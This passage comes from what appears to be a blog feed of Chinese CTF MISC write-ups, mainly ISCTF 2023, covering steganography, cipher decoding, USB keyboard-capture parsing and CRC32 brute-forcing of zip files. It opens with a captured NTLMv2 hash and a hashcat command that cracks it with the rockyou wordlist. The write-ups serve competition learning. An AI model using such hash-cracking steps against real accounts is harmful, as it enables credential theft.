class="line">jack::WidgetLLC.Internal:3e3966c8cacd29f7:ddd46fd8f78c262eae16918f66185497:010100000000000050fd26d235edd9011219408ccb8a364800000000020012005700490044004700450054004c004c0043000100100043004c00490045004e00540030003300040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000300360043004c00490045004e005400300033002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000700080050fd26d235edd90106000400020000000800300030000000000000000000000000300000c78e803920758ec5672c36696ee163f6a4e61c8b5463c247daef8571677995a40a001000000000000000000000000000000000000900200053004d00540050002f0075006e007300700065006300690066006900650064000000000000000000</span><br><span class="line"></span><br><span class="line">hashcat爆破:</span><br><span class="line">hashcat -m 5600 jack::WidgetLLC.Internal:3e3966c8cacd29f7:ddd46fd8f78c262eae16918f66185497:010100000000000050fd26d235edd9011219408ccb8a364800000000020012005700490044004700450054004c004c0043000100100043004c00490045004e00540030003300040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000300360043004c00490045004e005400300033002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000700080050fd26d235edd90106000400020000000800300030000000000000000000000000300000c78e803920758ec5672c36696ee163f6a4e61c8b5463c247daef8571677995a40a001000000000000000000000000000000000000900200053004d00540050002f0075006e007300700065006300690066006900650064000000000000000000 &#x27;/root/Desktop/rockyou.txt&#x27;</span><br><span class="line"></span><br><span class="line">SYC&#123;jack100589barney&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 ISCTF MISC WP</title>
      <link href="/2023-ISCTF-MISC-WP/"/>
      <url>/2023-ISCTF-MISC-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="easy-zip"><a href="#easy-zip" class="headerlink" title="easy_zip"></a>easy_zip</h2><p><img src="/2023-ISCTF-MISC-WP/1700746472387-8fafca59-8252-48a3-8a09-70e11eade0d7.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISCTF&#123;14be48d0-0ad5-496e-8fd7-3c4c5797a6ac&#125;</span><br></pre></td></tr></table></figure><h2 id="小猫"><a href="#小猫" class="headerlink" title="小猫"></a>小猫</h2><p>LSB隐写<br><img src="/2023-ISCTF-MISC-WP/1700659839842-3f9f36af-e175-4ecb-8918-d4645da63773.png" alt="image.png"><br><img src="/2023-ISCTF-MISC-WP/1700659889781-f4911541-66f6-4b7c-95a4-79a48154b8ee.jpeg" alt="out.jpg"><br>图片左上角坐标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">32 32 32 33 31 32 21</span><br><span class="line">32 42 42 33 21 32 21</span><br><span class="line">32 41 32 21 41 21 41</span><br><span class="line">23 41 22 32 32 32 12</span><br><span class="line">41 41 32 12 41 11 32</span><br><span class="line">32 41 31 41 41 41 23</span><br><span class="line">41 31 41 22 41 12 41</span><br><span class="line">13 32 12 41 11 41 31</span><br><span class="line">41 23 41 42 41 32 41</span><br><span class="line">42 32 12 32 31 32 32</span><br><span class="line">41 42 41 32 41 32 42</span><br><span class="line">43 42</span><br><span class="line"></span><br><span class="line"># 对应社会主义核心价值观</span><br><span class="line">公正 公正 公正 诚信 文明 公正 民主</span><br><span class="line">公正 法治 法治 诚信 民主 公正 民主</span><br><span class="line">公正 和谐 公正 民主 和谐 民主 和谐</span><br><span class="line">敬业 和谐 平等 公正 公正 公正 自由</span><br><span class="line">和谐 和谐 公正 自由 和谐 富强 公正</span><br><span class="line">公正 和谐 文明 和谐 和谐 和谐 敬业</span><br><span class="line">和谐 文明 和谐 平等 和谐 自由 和谐</span><br><span class="line">爱国 公正 自由 和谐 富强 和谐 文明</span><br><span class="line">和谐 敬业 和谐 法治 和谐 公正 和谐</span><br><span class="line">法治 公正 自由 公正 文明 公正 公正</span><br><span class="line">和谐 法治 和谐 公正 和谐 公正 法治</span><br><span class="line">友善 法治</span><br><span class="line"></span><br><span class="line"># 去空格换行</span><br><span class="line">公正公正公正诚信文明公正民主公正法治法治诚信民主公正民主公正和谐公正民主和谐民主和谐敬业和谐平等公正公正公正自由和谐和谐公正自由和谐富强公正公正和谐文明和谐和谐和谐敬业和谐文明和谐平等和谐自由和谐爱国公正自由和谐富强和谐文明和谐敬业和谐法治和谐公正和谐法治公正自由公正文明公正公正和谐法治和谐公正和谐公正法治友善法治</span><br><span class="line"></span><br><span class="line"># 社会主义核心价值观解码</span><br><span class="line">flag&#123;aca195fd3d0f2392548d029767dbf766&#125;</span><br></pre></td></tr></table></figure><h2 id="小蓝鲨的秘密"><a href="#小蓝鲨的秘密" class="headerlink" title="小蓝鲨的秘密"></a>小蓝鲨的秘密</h2><p><img src="/2023-ISCTF-MISC-WP/1700732532915-c2820f00-1d38-496a-bc46-03fbf10b0963.png" alt="image.png"><br>修复小蓝鲨.png，获取key：15CTF2023<br><img src="/2023-ISCTF-MISC-WP/1700732575601-b07b1f35-d13a-4528-9037-80d6b0f320d1.png" alt="image.png"><br><img src="/2023-ISCTF-MISC-WP/1700732602830-353f6b5b-c952-41ba-8048-0ab15f8b771e.png" alt="小蓝鲨_fix.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag.txt</span><br><span class="line">key:15CTF2023</span><br><span class="line">U2FsdGVkX1/ij5Hxtt6G8tDvbXIQcMLJ6isLpLmxqxW8mOmFIB4DgBGXSR3ceEcj</span><br><span class="line"></span><br><span class="line">AES解码</span><br><span class="line">ISCTF&#123;2832-3910-232-3742-7320&#125;</span><br></pre></td></tr></table></figure><h2 id="一心不可而用"><a href="#一心不可而用" class="headerlink" title="一心不可而用"></a>一心不可而用</h2><p>apk 目录 &#x2F;res&#x2F;drawable&#x2F;flag.zip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 压缩包注释中的报错信息</span><br><span class="line">File &quot;script.py&quot;, line 2</span><br><span class="line">TabError: unexpected EOF while parsing</span><br><span class="line">Exited with error status 1</span><br><span class="line"></span><br><span class="line"># 正确的报错信息</span><br><span class="line">synTaxError: unexpected EOF while parsing</span><br><span class="line"></span><br><span class="line"># 压缩包密synTaxError码</span><br><span class="line">SyntaxError</span><br><span class="line"></span><br><span class="line">flag&#123;Err0R_is_no7_ex1ste9&#125;</span><br></pre></td></tr></table></figure><h2 id="小白小黑"><a href="#小白小黑" class="headerlink" title="小白小黑"></a>小白小黑</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 非预期： </span></span><br><span class="line"><span class="comment"># 将每一个数字余2，构成一个二进制画出二维码</span></span><br><span class="line">out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">lines = <span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>).readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    line = line.strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> line:</span><br><span class="line">        num = <span class="built_in">int</span>(num)</span><br><span class="line">        out += <span class="built_in">str</span>(num%<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(out)</span><br></pre></td></tr></table></figure><p><img src="/2023-ISCTF-MISC-WP/1700662298230-fc3bdc51-037e-4b06-998c-9cdba140f220.png" alt="256_256.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 已经有二维码雏形，其中上面部分必然是白色边框的</span></span><br><span class="line"><span class="comment"># 统计了两行，发现两行总为 0，1，2，3，9 中的一个</span></span><br><span class="line"><span class="comment"># 尝试直接过滤，再将二进制转为二维码</span></span><br><span class="line"><span class="comment"># white_list = [0,1,2,3,9]</span></span><br><span class="line"></span><br><span class="line">out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">lines = <span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>).readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    line = line.strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> line:</span><br><span class="line">        num = <span class="built_in">int</span>(num)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> num <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">3</span>]:</span><br><span class="line">            out += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            out += <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(out)</span><br></pre></td></tr></table></figure><p><img src="/2023-ISCTF-MISC-WP/1700662558716-38f88f13-e817-4726-8c8f-ceffb49714ed.png" alt="256_256_inverse.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISCTF&#123;99517406-0378-4ba0-a873-70f245d6ca19&#125;</span><br></pre></td></tr></table></figure><h2 id="ezUSB"><a href="#ezUSB" class="headerlink" title="ezUSB"></a>ezUSB</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 过滤出两种流量</span><br><span class="line"># F:\WEB\Wireshark\tshark.exe -r C:\Users\HK\Desktop\usb.pcapng -T fields -Y &#x27;usb.src == &quot;2.4.2&quot; &amp;&amp; frame.cap_len == 46 &amp;&amp; usb.irp_info == 0x01&#x27; -e btatt.value &gt; C:\Users\HK\Desktop\usb.txt</span><br><span class="line"># F:\WEB\Wireshark\tshark.exe -r C:\Users\HK\Desktop\usb.pcapng -T fields -Y &#x27;frame.len == 64 &amp;&amp; usb.bInterfaceClass == 0x03&#x27; -e usbhid.data &gt; C:\Users\HK\Desktop\usb.txt</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>: <span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>: <span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>: <span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>: <span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>: <span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>: <span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>: <span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>: <span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>: <span class="string">&quot;i&quot;</span>,</span><br><span class="line">              <span class="string">&quot;0d&quot;</span>: <span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>: <span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>: <span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>: <span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>: <span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>: <span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>: <span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>: <span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>: <span class="string">&quot;r&quot;</span>,</span><br><span class="line">              <span class="string">&quot;16&quot;</span>: <span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>: <span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>: <span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>: <span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>: <span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>: <span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>: <span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>: <span class="string">&quot;z&quot;</span>, <span class="string">&quot;1e&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">              <span class="string">&quot;1f&quot;</span>: <span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>: <span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>: <span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>: <span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>: <span class="string">&quot;6&quot;</span>, <span class="string">&quot;24&quot;</span>: <span class="string">&quot;7&quot;</span>, <span class="string">&quot;25&quot;</span>: <span class="string">&quot;8&quot;</span>, <span class="string">&quot;26&quot;</span>: <span class="string">&quot;9&quot;</span>, <span class="string">&quot;27&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">              <span class="string">&quot;28&quot;</span>: <span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>: <span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>: <span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>: <span class="string">&quot;\t&quot;</span>, <span class="string">&quot;2c&quot;</span>: <span class="string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="string">&quot;2d&quot;</span>: <span class="string">&quot;-&quot;</span>, <span class="string">&quot;2e&quot;</span>: <span class="string">&quot;=&quot;</span>, <span class="string">&quot;2f&quot;</span>: <span class="string">&quot;[&quot;</span>,</span><br><span class="line">              <span class="string">&quot;30&quot;</span>: <span class="string">&quot;]&quot;</span>, <span class="string">&quot;31&quot;</span>: <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;32&quot;</span>: <span class="string">&quot;&lt;NON&gt;&quot;</span>, <span class="string">&quot;33&quot;</span>: <span class="string">&quot;;&quot;</span>, <span class="string">&quot;34&quot;</span>: <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;35&quot;</span>: <span class="string">&quot;&lt;GA&gt;&quot;</span>, <span class="string">&quot;36&quot;</span>: <span class="string">&quot;,&quot;</span>, <span class="string">&quot;37&quot;</span>: <span class="string">&quot;.&quot;</span>, <span class="string">&quot;38&quot;</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">              <span class="string">&quot;39&quot;</span>: <span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>: <span class="string">&quot;&lt;F1&gt;&quot;</span>, <span class="string">&quot;3b&quot;</span>: <span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>: <span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>: <span class="string">&quot;&lt;F4&gt;&quot;</span>, <span class="string">&quot;3e&quot;</span>: <span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>: <span class="string">&quot;&lt;F6&gt;&quot;</span>,</span><br><span class="line">              <span class="string">&quot;40&quot;</span>: <span class="string">&quot;&lt;F7&gt;&quot;</span>, <span class="string">&quot;41&quot;</span>: <span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>: <span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>: <span class="string">&quot;&lt;F10&gt;&quot;</span>, <span class="string">&quot;44&quot;</span>: <span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>: <span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>: <span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>: <span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>: <span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>: <span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>: <span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>: <span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>: <span class="string">&quot;I&quot;</span>,</span><br><span class="line">             <span class="string">&quot;0d&quot;</span>: <span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>: <span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>: <span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>: <span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>: <span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>: <span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>: <span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>: <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>: <span class="string">&quot;R&quot;</span>,</span><br><span class="line">             <span class="string">&quot;16&quot;</span>: <span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>: <span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>: <span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>: <span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>: <span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>: <span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>: <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>: <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;1e&quot;</span>: <span class="string">&quot;!&quot;</span>,</span><br><span class="line">             <span class="string">&quot;1f&quot;</span>: <span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>: <span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>: <span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>: <span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>: <span class="string">&quot;^&quot;</span>, <span class="string">&quot;24&quot;</span>: <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;25&quot;</span>: <span class="string">&quot;*&quot;</span>, <span class="string">&quot;26&quot;</span>: <span class="string">&quot;(&quot;</span>, <span class="string">&quot;27&quot;</span>: <span class="string">&quot;)&quot;</span>,</span><br><span class="line">             <span class="string">&quot;28&quot;</span>: <span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>: <span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>: <span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>: <span class="string">&quot;\t&quot;</span>, <span class="string">&quot;2c&quot;</span>: <span class="string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="string">&quot;2d&quot;</span>: <span class="string">&quot;_&quot;</span>, <span class="string">&quot;2e&quot;</span>: <span class="string">&quot;+&quot;</span>, <span class="string">&quot;2f&quot;</span>: <span class="string">&quot;&#123;&quot;</span>,</span><br><span class="line">             <span class="string">&quot;30&quot;</span>: <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;31&quot;</span>: <span class="string">&quot;|&quot;</span>, <span class="string">&quot;32&quot;</span>: <span class="string">&quot;&lt;NON&gt;&quot;</span>, <span class="string">&quot;33&quot;</span>: <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;34&quot;</span>: <span class="string">&quot;:&quot;</span>, <span class="string">&quot;35&quot;</span>: <span class="string">&quot;&lt;GA&gt;&quot;</span>, <span class="string">&quot;36&quot;</span>: <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;37&quot;</span>: <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;38&quot;</span>: <span class="string">&quot;?&quot;</span>,</span><br><span class="line">             <span class="string">&quot;39&quot;</span>: <span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>: <span class="string">&quot;&lt;F1&gt;&quot;</span>, <span class="string">&quot;3b&quot;</span>: <span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>: <span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>: <span class="string">&quot;&lt;F4&gt;&quot;</span>, <span class="string">&quot;3e&quot;</span>: <span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>: <span class="string">&quot;&lt;F6&gt;&quot;</span>,</span><br><span class="line">             <span class="string">&quot;40&quot;</span>: <span class="string">&quot;&lt;F7&gt;&quot;</span>, <span class="string">&quot;41&quot;</span>: <span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>: <span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>: <span class="string">&quot;&lt;F10&gt;&quot;</span>, <span class="string">&quot;44&quot;</span>: <span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>: <span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">lines = <span class="built_in">open</span>(<span class="string">&#x27;./usb.txt&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>).readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    line = line.strip()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check = line[0:2]</span></span><br><span class="line">    <span class="comment"># key = line[4:6]</span></span><br><span class="line">    </span><br><span class="line">    check = line[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">    key = line[<span class="number">6</span>:<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> check == <span class="string">&#x27;02&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            out += normalKeys[key]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            out += shiftKeys[key]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(check,key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(out)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;CAP&gt;aggsz&#123;k&lt;CAP&gt;p_wn_&lt;CAP&gt;yrv</span><br><span class="line">&lt;CAP&gt;_so&lt;DEL&gt;&lt;DEL&gt;sov_je&lt;DEL&gt;mzus&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;fyffjs!!b&lt;DEL&gt;!&#125;</span><br><span class="line"></span><br><span class="line"># 转换字符</span><br><span class="line">AGGSZ&#123;Kp_wn_YRV_sov_jmfyffjs!!!&#125;</span><br><span class="line"></span><br><span class="line"># 对应开头 AGGSZ 对应 ISCTF 反推key：soezusb</span><br><span class="line">ISCTF&#123;So_ez_USB_and_vigenere!!!&#125;</span><br></pre></td></tr></table></figure><h2 id="EZcrc"><a href="#EZcrc" class="headerlink" title="EZcrc"></a>EZcrc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zipf = zipfile.ZipFile(<span class="string">&#x27;./flag.zip&#x27;</span>)</span><br><span class="line">zipf_len = <span class="built_in">len</span>(zipf.namelist())</span><br><span class="line">word_list = <span class="built_in">range</span>(<span class="number">256</span>) <span class="comment"># 字符集为0x00~0xff，试过可见字符，爆不出</span></span><br><span class="line"></span><br><span class="line">crc_dist = &#123;&#125;</span><br><span class="line">crc_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(zipf_len):</span><br><span class="line">    file_name = <span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>.txt&#x27;</span></span><br><span class="line">    file_crc = zipf.getinfo(file_name).CRC</span><br><span class="line">    crc_list.append(file_crc)</span><br><span class="line"></span><br><span class="line">crc_list = Counter(crc_list).keys()</span><br><span class="line"><span class="keyword">for</span> crc <span class="keyword">in</span> crc_list:</span><br><span class="line">    byte_list = itertools.product(word_list, repeat=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> byte_list:</span><br><span class="line">        data = <span class="built_in">bytes</span>(byte)</span><br><span class="line">        <span class="keyword">if</span> binascii.crc32(data) == crc:</span><br><span class="line">            crc_dist[<span class="built_in">str</span>(crc)] = data</span><br><span class="line"></span><br><span class="line">out = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(zipf_len):</span><br><span class="line">    file_name = <span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>.txt&#x27;</span></span><br><span class="line">    file_crc = zipf.getinfo(file_name).CRC</span><br><span class="line">    out += crc_dist[<span class="built_in">str</span>(file_crc)]</span><br><span class="line"></span><br><span class="line"><span 